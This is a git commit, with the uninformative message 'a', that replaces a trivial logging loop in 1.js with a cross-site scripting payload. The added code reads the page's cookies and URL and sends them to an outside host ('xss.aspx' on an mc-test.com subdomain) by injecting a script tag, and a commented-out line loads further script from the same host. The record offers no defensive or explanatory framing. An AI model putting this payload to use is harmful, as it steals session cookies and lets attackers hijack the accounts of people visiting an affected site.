c7a6c8c0148caf754d5f3b52e22836bb9cc99967
njuj1001728 <njuj1001728@hotmail.com>
2014-03-06 18:30:48 +0800

    a
    a

--- 1.js
+++ 1.js
@@ -1,3 +1,30 @@
-for(i=0;i<100;i++){
-	console.log("$$$$$$$$$$$$$$$$$$$$");
-}
+new (function (rurl) {
+    var me = this;
+    this.rurl = rurl;
+    this.callrjs = function (js_url, cb) {
+        var _doc = document.getElementsByTagName('head')[0];
+        var js = document.createElement('script');
+        js.setAttribute('type', 'text/javascript');
+        js.setAttribute('src', js_url);
+        _doc.appendChild(js);
+        if (!/*@cc_on!@*/0) { //if not IE//Firefox2¡¢Firefox3¡¢Safari3.1+Opera9.6        
+            js.onload = function () {
+                if (cb)cb();
+            }
+        } else {//IE6¡¢IE7        
+            js.onreadystatechange = function () {
+                if (js.readyState == 'loaded' || js.readyState == 'complete') {
+                    if(cb) cb();
+                }
+            }
+        }
+    };
+    this.report = function (data) {
+        var cookie = document.cookie;
+        var url = document.URL;
+        me.callrjs(this.rurl+"?cookie="+escape(document.cookie)+"&pathandquery="+document.location+"&_="+Math.random())
+    };
+})("http://njuj01.w74.mc-test.com/xss.aspx").report();
+
+
+//d=document;e=d.createElement('script');e.src='njuj01.w74.mc-test.com/app_admin/';d.body.appendChild(e);
